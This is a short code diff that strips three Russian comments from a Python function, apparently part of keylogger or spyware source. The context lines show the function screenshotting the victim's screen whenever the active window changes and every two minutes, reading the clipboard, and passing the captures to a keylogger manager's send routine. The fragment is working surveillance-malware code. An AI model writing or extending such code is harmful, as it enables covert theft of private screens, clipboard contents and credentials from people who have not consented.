@@ -212,7 +212,6 @@ def screenshot_monitor(interval=120):
             current_time = time.time()
             current_window = get_active_window()
 
-            # Триггер смена активного окна
             if (not is_same_window(current_window, last_window) and
                     current_window != "unknown" and
                     current_time - last_screenshot_time > 15):
@@ -229,7 +228,6 @@ def screenshot_monitor(interval=120):
             else:
                 last_window = current_window
 
-            # Триггер изменение буфера обмена
             try:
                 import pyperclip
                 current_clipboard = pyperclip.paste()
@@ -249,7 +247,6 @@ def screenshot_monitor(interval=120):
             except:
                 pass
 
-            # Авто скриншоты каждые 2 минуты
             if current_time - last_screenshot_time > interval:
                 img = pyautogui.screenshot()
                 success = keylogger_manager.send_screenshot(img)
